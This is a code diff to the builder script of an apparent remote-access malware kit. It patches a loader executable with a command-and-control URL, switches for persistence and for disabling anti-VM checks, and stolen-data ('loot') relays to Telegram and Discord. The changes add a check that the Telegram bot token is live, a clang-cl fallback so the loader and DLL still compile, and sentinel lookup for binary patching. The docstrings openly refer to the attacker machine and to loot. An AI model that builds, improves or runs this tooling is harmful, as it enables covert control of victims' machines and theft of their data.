@@ -49,8 +49,9 @@ What it does:
 
 Press Ctrl+C to stop early.
 """
-import json, os, re, shutil, socket, subprocess, sys, time, struct, urllib.request, urllib.parse
+import json, os, re, shutil, socket, subprocess, sys, time, struct, urllib.error, urllib.request, urllib.parse
 from c2auth import parse_c2_url, port_from_url
+from peutil import find_sentinel
 
 HERE   = os.path.dirname(os.path.abspath(__file__))
 BIN    = os.path.join(HERE, "bin")
@@ -95,6 +96,51 @@ def save_config(cfg):
             json.dump(cfg, f, indent=2, ensure_ascii=False)
     except Exception as ex:
         log("[-] failed to save config: %s" % ex)
+
+def telegram_probe(token):
+    """getMe preflight. Returns (state, info) with state ok / dead / unknown.
+
+    config.json can hold a key that was never a live bot token (or was revoked).
+    Printing "relay: enabled" for one of those is a lie: the listener starts, the
+    loot arrives, and every Telegram POST returns 401 into a console nobody reads.
+    Only a definitive rejection disables the relay; an offline attacker machine
+    must not silently drop a working key.
+    """
+    if not token:
+        return "dead", "empty"
+    if ":" not in token:
+        return "dead", "expected bot_token:chat_id (got no ':'); run: python auto.py --tg-chatid <token>"
+    bot = token.rsplit(":", 1)[0]
+    try:
+        with urllib.request.urlopen("https://api.telegram.org/bot%s/getMe" % bot, timeout=8) as r:
+            data = json.loads(r.read().decode("utf-8", "replace"))
+        if data.get("ok"):
+            return "ok", (data.get("result") or {}).get("username") or "bot"
+        return "dead", data.get("description") or "reply not ok"
+    except urllib.error.HTTPError as ex:
+        try:
+            body = json.loads(ex.read().decode("utf-8", "replace"))
+            return "dead", "%s (%s)" % (body.get("description", "HTTP %d" % ex.code), ex.code)
+        except Exception:
+            return "dead", "HTTP %d" % ex.code
+    except Exception as ex:
+        return "unknown", "%s: %s" % (ex.__class__.__name__, ex)
+
+def gate_telegram(token):
+    """Verify a Telegram key before it is passed to the listener. None = no relay."""
+    if not token:
+        return None
+    state, info = telegram_probe(token)
+    if state == "ok":
+        log("[+] Telegram relay: enabled (@%s)" % info)
+        return token
+    if state == "dead":
+        log("[!] Telegram relay: disabled -- the saved key is not a live bot token")
+        log("[!]   %s" % info)
+        log("[!]   fix it: python auto.py --telegram bot_token:chat_id")
+        return None
+    log("[!] Telegram relay: enabled (could not verify now: %s)" % info)
+    return token
 
 def show_config():
     """Print current saved config."""
@@ -251,22 +297,123 @@ def _find_vcvars():
             return c
     return None
 
-def _compiler_ready():
-    """cl.exe + ml64.exe only exist after vcvars; check the install itself."""
+def _msvc_toolset():
+    """(toolset_dir) from vcvars64.bat, or None.
+
+    vcvars64.bat sits in <install>\\VC\\Auxiliary\\Build, so the toolset is
+    <install>\\VC\\Tools\\MSVC\\<ver>. Walking four levels up and joining
+    "Tools\\MSVC" lands on <install>\\Tools\\MSVC, which never exists -- that
+    was why the old check reported a missing toolset on a complete install.
+    """
     vc = _find_vcvars()
     if not vc:
-        return False, "vcvars64.bat not found (Visual Studio C++ build tools missing)"
-    root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(vc))))
-    msvc = os.path.join(root, "Tools", "MSVC")
+        return None
+    vc_dir = os.path.dirname(os.path.dirname(os.path.dirname(vc)))   # <install>\VC
+    msvc = os.path.join(vc_dir, "Tools", "MSVC")
     if not os.path.isdir(msvc):
-        return False, "MSVC toolset directory missing under %s" % root
-    for ver in os.listdir(msvc):
-        cl = os.path.join(msvc, ver, "bin", "Hostx64", "x64", "cl.exe")
-        ml = os.path.join(msvc, ver, "bin", "Hostx64", "x64", "ml64.exe")
+        return None
+    for ver in sorted(os.listdir(msvc), reverse=True):
+        if os.path.isdir(os.path.join(msvc, ver)):
+            return os.path.join(msvc, ver)
+    return None
+
+
+def _clang_bin():
+    """clang-cl.exe's directory: the unpacked LLVM first, then PATH."""
+    local = os.path.join(os.environ.get("USERPROFILE", ""), "toolchain",
+                         "clang+llvm-19.1.7-x86_64-pc-windows-msvc", "bin")
+    if os.path.isfile(os.path.join(local, "clang-cl.exe")):
+        return local
+    found = shutil.which("clang-cl")
+    return os.path.dirname(found) if found else None
+
+
+def _sdk_version():
+    """Newest Windows 10/11 SDK that actually ships um headers and x64 libs."""
+    base = os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"),
+                        "Windows Kits", "10")
+    inc = os.path.join(base, "Include")
+    if not os.path.isdir(inc):
+        return None
+    vers = [d for d in os.listdir(inc)
+            if d.startswith("10.") and os.path.isfile(os.path.join(inc, d, "um", "windows.h"))]
+    vers.sort(key=lambda v: [int(x) for x in v.split(".") if x.isdigit()], reverse=True)
+    for v in vers:
+        if os.path.isfile(os.path.join(base, "Lib", v, "um", "x64", "kernel32.lib")):
+            return v
+    return None
+
+
+def _rc_exe(sdk_ver):
+    """rc.exe from the unpacked SDK BuildTools package, then the SDK bin tree.
+
+    There is no MSVC resource compiler in the toolset directory, so build_clang.bat
+    needs an external one: either NuGet's Microsoft.Windows.SDK.BuildTools or the
+    Windows Kits bin tree (stripped on some installs).
+    """
+    bt = os.path.join(os.environ.get("USERPROFILE", ""), "toolchain", "sdkbt", "bin")
+    if os.path.isdir(bt):
+        for ver in sorted(os.listdir(bt), reverse=True):
+            c = os.path.join(bt, ver, "x64", "rc.exe")
+            if os.path.isfile(c):
+                return c
+    if sdk_ver:
+        c = os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"),
+                         "Windows Kits", "10", "bin", sdk_ver, "x64", "rc.exe")
+        if os.path.isfile(c):
+            return c
+    return None
+
+
+def _clang_ready():
+    """clang-cl + lld-link + llvm-ml + MSVC headers/libs + SDK libs + rc.exe.
+
+    The compiler binaries can be stripped from a VS install while its headers,
+    libs and CRT survive. clang-cl produces the same MSVC-ABI objects from those
+    files, so the fallback is a real toolchain, not a degraded one.
+    """
+    if not os.path.isfile(os.path.join(HERE, "build_clang.bat")):
+        return False, "build_clang.bat missing"
+    cbin = _clang_bin()
+    if not cbin:
+        return False, "clang-cl.exe not found (unpack LLVM into %USERPROFILE%\\toolchain)"
+    for exe in ("clang-cl.exe", "lld-link.exe", "llvm-ml.exe"):
+        if not os.path.isfile(os.path.join(cbin, exe)):
+            return False, "%s missing next to clang-cl.exe" % exe
+    msvc = _msvc_toolset()
+    if not msvc or not os.path.isfile(os.path.join(msvc, "include", "vcruntime.h")):
+        return False, "MSVC headers/libs not found (clang-cl still needs them)"
+    if not os.path.isdir(os.path.join(msvc, "lib", "x64")):
+        return False, "MSVC x64 libs missing under %s" % msvc
+    sdk = _sdk_version()
+    if not sdk:
+        return False, "Windows SDK 10 headers/libs not found"
+    um = os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"),
+                      "Windows Kits", "10", "Lib", sdk, "um", "x64", "kernel32.lib")
+    if not os.path.isfile(um):
+        return False, "Windows SDK %s x64 libs missing" % sdk
+    if not _rc_exe(sdk):
+        return False, "rc.exe not found (SDK bin tree or toolchain\\sdkbt)"
+    return True, "clang-cl (%s)" % os.path.basename(msvc)
+
+
+def _compiler_ready():
+    """MSVC first; fall back to clang-cl when the install has headers but no .exe."""
+    msvc = _msvc_toolset()
+    if msvc:
+        ver = os.path.basename(msvc)
+        cl = os.path.join(msvc, "bin", "Hostx64", "x64", "cl.exe")
+        ml = os.path.join(msvc, "bin", "Hostx64", "x64", "ml64.exe")
         if os.path.isfile(cl) and os.path.isfile(ml):
             return True, ver
-    return False, ("MSVC is installed but cl.exe/ml64.exe are missing -- repair "
-                   "'Desktop development with C++' in the Visual Studio Installer")
+    ok, info = _clang_ready()
+    if ok:
+        return True, info
+    if msvc:
+        return False, ("cl.exe/ml64.exe missing and no clang fallback: %s -- repair "
+                       "'Desktop development with C++' in the Visual Studio Installer"
+                       % info)
+    return False, info
 
 def ensure_build():
     """Build loader.exe + ckdll.dll if they don't exist."""
@@ -360,17 +507,17 @@ def _patch_loader(loader_bytes, c2_url, persist=False, no_anti_vm=False):
         old_len = struct.unpack_from("<I", loader_bytes, idx - 4)[0]
         loader_bytes = loader_bytes[:idx - 4 - old_len]
     if c2_url:
-        sidx = loader_bytes.find(C2_SENTINEL)
+        sidx = find_sentinel(loader_bytes, C2_SENTINEL, 256)
         if sidx != -1:
             url_bytes = c2_url.encode("utf-8")[:255]
             url_padded = url_bytes + b"\0" * (256 - len(url_bytes))
             loader_bytes = loader_bytes[:sidx] + url_padded + loader_bytes[sidx+256:]
     if persist:
-        pidx = loader_bytes.find(PERSIST_SENTINEL)
+        pidx = find_sentinel(loader_bytes, PERSIST_SENTINEL, 8)
         if pidx != -1:
             loader_bytes = loader_bytes[:pidx] + PERSIST_ENABLE + loader_bytes[pidx+8:]
     if no_anti_vm:
-        aidx = loader_bytes.find(AV_SENTINEL)
+        aidx = find_sentinel(loader_bytes, AV_SENTINEL, 8)
         if aidx != -1:
             loader_bytes = loader_bytes[:aidx] + AV_DISABLE + loader_bytes[aidx+8:]
     return loader_bytes
@@ -1533,8 +1680,7 @@ def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_ant
         ip = detect_ip()
         c2_url = "http://%s:%d/" % (ip, port)
         log("[+] C2 URL: %s" % c2_url)
-    if telegram:
-        log("[+] Telegram relay: enabled")
+    telegram = gate_telegram(telegram)
     if discord:
         log("[+] Discord relay: enabled")
     if persist:
@@ -1808,8 +1954,7 @@ def main():
             return 1
         c2_url = "http://%s:%d/" % (ip, port)
         log("[+] C2 URL: %s" % c2_url)
-    if telegram:
-        log("[+] Telegram relay: enabled")
+    telegram = gate_telegram(telegram)
     if discord:
         log("[+] Discord relay: enabled")
     if persist:
